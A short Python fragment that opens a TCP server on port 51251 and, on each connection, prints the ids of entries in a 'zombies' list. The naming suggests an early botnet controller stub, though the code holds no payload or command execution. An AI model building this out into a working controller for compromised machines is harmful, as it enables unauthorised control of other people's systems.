import time
import socket
import listener

def start():
	# create an INET, STREAMing socket
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# bind the socket to a public host, and a well-known port
	serversocket.bind((socket.gethostname(), 51251))
	# become a server socket
	serversocket.listen(5)
	
	

	while True:
		(clientsocket, address) = serversocket.accept()
		for z in listener.zombies:
			print(z.id)
